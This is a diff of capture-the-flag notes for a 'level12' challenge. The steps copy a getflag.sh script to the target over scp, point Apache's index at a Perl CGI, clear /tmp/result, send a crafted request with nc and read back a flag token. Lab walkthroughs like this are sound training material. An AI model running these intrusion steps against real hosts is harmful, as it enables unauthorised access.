@@ -6,6 +6,7 @@
 - vim /etc/apache2/sites-available/level12.conf
 	DirectoryIndex level12.pl <- exploit on / index
 - scp -P 4242 getflag.sh level12@192.168.1.?:/tmp/_
+- rm -rf /tmp/result
 - nc 192.168.1.? 4646 < cgi_request
 - cat /tmp/result
 	g1qKMiRpXf53AWhDaU7FEkczr
